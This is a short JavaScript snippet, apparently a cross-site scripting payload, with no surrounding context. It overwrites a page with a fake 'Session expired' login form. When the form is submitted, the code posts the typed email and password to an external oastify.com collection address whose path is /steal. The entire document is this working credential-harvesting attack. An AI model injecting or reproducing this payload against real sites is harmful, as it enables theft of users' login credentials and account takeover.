
document.write(`
  <h2 style="font-family:sans-serif;">Session expired</h2>
  <p>Please log in again to continue.</p>
  <form onsubmit="fetch('https://joboi5is224xx9rpfluze1ydv41vpmka9.oastify.com/steal', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      user: document.querySelector('#user').value,
      pass: document.querySelector('#pass').value
    })
  }); return false;">
    <input id="user" placeholder="Email" required><br>
    <input id="pass" type="password" placeholder="Password" required><br>
    <button type="submit">Log In</button>
  </form>
`);

